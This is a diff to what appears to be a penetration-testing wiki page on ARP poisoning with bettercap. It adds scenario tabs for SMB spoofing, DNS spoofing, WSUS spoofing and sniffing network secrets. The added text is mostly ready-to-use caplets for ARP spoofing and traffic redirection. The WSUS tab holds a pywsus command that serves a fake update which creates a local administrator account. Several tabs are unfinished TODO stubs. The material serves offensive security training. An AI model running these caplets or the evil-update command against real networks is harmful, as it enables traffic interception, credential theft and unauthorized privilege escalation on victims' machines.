@@ -88,39 +88,130 @@ Bettercap's logging can be controlled so that only essential information is show
 * make sure to run bettercap in a privileged container with network host
 * options can be written in a `.cap` file and launched with bettercap with the following command and options`bettercap --iface $interface --caplet caplet.cap`
 
-## Scenarios
+## Scenarios examples
 
-WSUS + hijacking + two subnets \(attacker + client in the same, packets destination server in another one, because if so, packets go through gateway, we have to spoof the gateway in the client's ARP table\)
+//TODO : explain scenarios
 
+{% tabs %}
+{% tab title="SMB spoofing" %}
+//TODO
+
+combine this with inveigh/responder \(capture\) or inveigh-relay/ntlmrelayx \(relay\)
+{% endtab %}
+
+{% tab title="DNS spoofing" %}
+//TODO
+
+start the DNS server \(responder, dnschef, or bettercap\) then start the poisoning attack
+
+{% code title="wsus\_spoofing.cap" %}
 ```bash
+# quick recon of the network
 net.probe on
 
+# set the ARP spoofing
 set arp.spoof.targets $client_ip
 set arp.spoof.internal false
 set arp.spoof.fullduplex false
 
+# reroute traffic aimed at the WSUS server
 set any.proxy.iface $interface
-set any.proxy.protocol TCP
-set any.proxy.src_address $server_ip
-set any.proxy.src_port $server_address
+set any.proxy.protocol UDP
+set any.proxy.src_address $DNS_server_ip
+set any.proxy.src_port 53
 set any.proxy.dst_address $attacker_ip
-set any.proxy.dst_port $attacker_port
+set any.proxy.dst_port 53
 
-events.ignore endpoint.lost
-events.ignore endpoint.new
-events.ignore net.sniff.mdns
-events.ignore net.sniff.dns
-events.ignore net.sniff.https
+# control logging and verbosity
+events.ignore endpoint
+events.ignore net.sniff
+events.include net.sniff.dns
 
+# start the modules
 any.proxy on
 arp.spoof on
 net.sniff on
 ```
+{% endcode %}
+{% endtab %}
 
-Other scenarios
+{% tab title="WSUS spoofing" %}
+ARP poisoning for [WSUS spoofing ](../../../systems-and-services/privilege-escalation/windows/wsus-attacks.md)in a two-subnets layout \(attacker + client in the same segment, legitimate WSUS server in another one\). Packets from the client to the WSUS server need to be hijacked and sent to the attacker's evil WSUS server. In order to do so, the attacker must pose as the client's gateway, route all traffic to the real gateway except the packets destined to the WSUS server.
 
-* DNS poisoning
-* ...
+The evil WSUS server needs to be started before doing ARP poisoning. The [pywsus ](https://github.com/GoSecure/pywsus)\(Python\) utility can be used for that matter.
+
+```bash
+python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser /add && net localgroup Administrators testuser /add"'
+```
+
+Once the WSUS server is up and running, the ARP poisoning attack can start.
+
+{% code title="wsus\_spoofing.cap" %}
+```bash
+# quick recon of the network
+net.probe on
+
+# set the ARP spoofing
+set arp.spoof.targets $client_ip
+set arp.spoof.internal false
+set arp.spoof.fullduplex false
+
+# reroute traffic aimed at the WSUS server
+set any.proxy.iface $interface
+set any.proxy.protocol TCP
+set any.proxy.src_address $WSUS_server_ip
+set any.proxy.src_port 8530
+set any.proxy.dst_address $attacker_ip
+set any.proxy.dst_port 8530
+
+# control logging and verbosity
+events.ignore endpoint
+events.ignore net.sniff
+events.include net.sniff.http
+
+# start the modules
+any.proxy on
+arp.spoof on
+net.sniff on
+```
+{% endcode %}
+
+The caplet above can be loaded with the following command in order to launch the ARP poisoning attack.
+
+```bash
+bettercap --iface $interface --caplet wsus_spoofing.cap
+```
+
+The lookup for Windows updates can be manually triggered when having access to the target computer by going to `Settings > Update & Security > Windows Update > Check for updates`.
+{% endtab %}
+
+{% tab title="Dumping network secrets" %}
+// TODO
+
+Start PCredz or Wireshark then start the poisoning attack
+
+{% code title="wsus\_spoofing.cap" %}
+```bash
+
+# set the ARP poisoning
+set arp.spoof.targets $client_ip
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+
+# control logging and verbosity
+events.ignore endpoint
+events.ignore net.sniff
+events.include net.sniff.http
+
+# start the modules
+arp.spoof on
+net.sniff on
+```
+{% endcode %}
+
+//
+{% endtab %}
+{% endtabs %}
 
 ## Below this is info I need to RTFM on...
 
